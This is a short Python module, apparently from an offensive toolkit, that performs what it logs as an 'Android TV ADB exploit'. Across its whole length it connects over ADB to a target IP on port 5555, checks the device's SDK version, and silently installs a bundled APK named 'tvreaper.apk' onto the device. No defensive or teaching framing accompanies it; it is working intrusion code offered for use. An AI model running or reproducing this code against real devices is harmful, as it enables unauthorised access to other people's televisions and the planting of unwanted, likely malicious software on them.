#!/usr/bin/env python3
import subprocess
import sys
import os
from core.utils import logger

def install(target_ip):
    logger.info(f"Attempting Android TV ADB exploit on {target_ip}...")

    # 1. Connect
    try:
        subprocess.run(["adb", "connect", f"{target_ip}:5555"], timeout=10, capture_output=True)
        result = subprocess.run(["adb", "shell", "getprop", "ro.build.version.sdk"],
                                timeout=5, capture_output=True)
        if result.returncode != 0:
            logger.error("ADB connection failed.")
            return False
    except subprocess.TimeoutExpired:
        logger.error("ADB connection timeout.")
        return False

    apk_path = "resources/tvreaper.apk"
    if not os.path.exists(apk_path):
        logger.error(f"APK file missing: {apk_path}")
        return False

    try:
        result = subprocess.run(["adb", "install", apk_path], timeout=180, capture_output=True)
        if result.returncode == 0:
            logger.info("APK installed.")
            return True
        else:
            logger.error(f"Install failed: {result.stderr.decode()}")
            return False
    except subprocess.TimeoutExpired:
        logger.error("Install timeout.")
        return False
